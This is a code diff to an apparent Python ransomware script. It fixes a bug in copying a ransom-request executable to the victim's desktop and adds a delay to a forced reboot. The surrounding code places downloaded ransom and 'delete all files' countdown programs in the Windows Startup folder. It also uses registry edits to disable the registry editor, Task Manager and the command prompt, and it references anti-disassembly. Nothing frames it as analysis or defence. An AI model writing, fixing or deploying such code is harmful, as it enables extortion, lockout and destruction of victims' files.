@@ -26,7 +26,7 @@ def download_ransom_request():
         dir_startup = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'.format(os.getenv('username'))
         # Script that will show the ransom request
         wget.download('mediafire.com',out=dir_startup+'ransom_request.exe')
-        shutil.copy(dir_startup+'rescue_request.exe','C:\\Users\\{}\\Desktop\\ransom_request.exe')
+        shutil.copy(dir_startup+'rescue_request.exe','C:\\Users\\{}\\Desktop\\ransom_request.exe'.format(os.getenv('username')))
         # Script that counts the 4 days to delete all files
         wget.download('mediafire.com',out=dir_startup+'time_script.exe')
     except:
@@ -37,9 +37,9 @@ def disable_all():
         os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
         os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
         os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
-        os.system('shutdown /r /f')
+        os.system('shutdown /r /f /t 3')
     except:
-        os.system('shutdown /r /f')
+        os.system('shutdown /r /f /t 3')
 
 def main():
     anti_disassembly()
